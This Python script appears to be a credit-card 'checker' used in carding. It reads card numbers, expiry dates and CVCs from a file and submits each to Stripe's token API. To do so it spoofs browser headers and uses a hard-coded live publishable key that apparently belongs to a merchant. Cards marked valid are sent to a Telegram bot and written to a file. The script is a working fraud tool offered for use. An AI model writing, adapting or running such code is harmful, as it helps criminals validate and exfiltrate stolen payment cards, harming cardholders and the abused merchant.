from requests import post
import os
# checker is based on stripe api if the api fucked up , thats not from me .
def saver(card,card_msg):
    ID=''#telegram id
    token=''#telegram bot token
    try:post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=• Hi there, i have a new card for you  🦦 \n\n{card_msg}\n\nBy\t@TweakPY\t-\t@vv1ck')
    except:pass
    with open('cards-live.txt', 'a') as x:
        x.write(card+'\n')
def CC_Checker():
    bad,count,done=0,0,0
    try:file=open('cards.txt','r')
    except FileNotFoundError:exit('[!] No cards File Detected - Note cards file must be in cards.txt File ..')
    while True:
        try:
            card=file.readline().split('\n')[0]#5313640057574778|11|24|853
            card_number=card.split("|")[0]
            exp_month=card.split("|")[1]
            exp_year=card.split("|")[2]
            cvc=card.split("|")[3]
        except IndexError:exit('\n\n[!] The Check has been completed .. \n')
        r=post("https://api.stripe.com/v1/tokens",headers={'Host': 'api.stripe.com','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0','Accept': 'application/json','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','Referer': 'https://js.stripe.com/v3/controller-862a80dbaa554971d8cf5c0ce836dc66.html','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://js.stripe.com','Content-Length': '358','Te': 'trailers'},data=f'card[number]={card_number}&card[cvc]={cvc}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&key=pk_live_sq77vLTlEPpJkEH9xXlzk5dx00ZYPskAJn')
        #id=r.json()['id']
        #if 'Your card number is incorrect.' in r.text:print("[!] this Card is Fake , Card number is incorrect !")
        #elif 'The card number is not a valid credit card number.' in r.text:print("[!] this Card is Fake , Card Number is not valid !")
        #elif "Your card is not supported." in r.text:print("[!] this Card is unknown , Card is not supported -!")
        #elif "Your card's security code is invalid." in r.text:print("[!] this Card is Fake , Card security code is invalid !")    
        #elif "invalid_expiry_month" in r.text:print("[!] this Card is Fake , Card expiration month is invalid !")
        #elif "invalid_expiry_year" in r.text:print("[!] this Card is Fake , Card expiration year is invalid !")
        #elif 'invalid_number' in r.text:print('[!] this Card is Fake , Card number is incorrect !')
        if 'brand' in r.text:
            rj=r.json()['card'];rjc=r.json()
            card_msg=f"Card : [ {card} ]\nCard Brand : [ {rj['brand']} ]\nCountry : [ {rj['country']} ]\nCVC Check : [ {rj['cvc_check']} ]\nused : [ {rjc['used']} ]"
            count+=1
            done+=1
            banner()
            print(f'$ CreditCards Check\n\n- Live : {done}\n- Bad : {bad}\n- Total Count : {count}  ')
            saver(card,card_msg)
        else:
            count+=1
            bad+=1
            banner()
            print(f'$ CreditCards Check\n\n- Live : {done}\n- Bad : {bad}\n- Total Count : {count}  ')
def banner():
    os.system("cls" if os.name=="nt" else "clear")
    print("""
 ██████╗ ██████╗               ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔════╝██╔════╝              ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║     ██║         █████╗    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║     ██║         ╚════╝    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╗╚██████╗              ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
 ╚═════╝ ╚═════╝               ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                                                                       
                                                                                                    
                           By @TweakPY - @vv1ck\n""")
banner();CC_Checker()


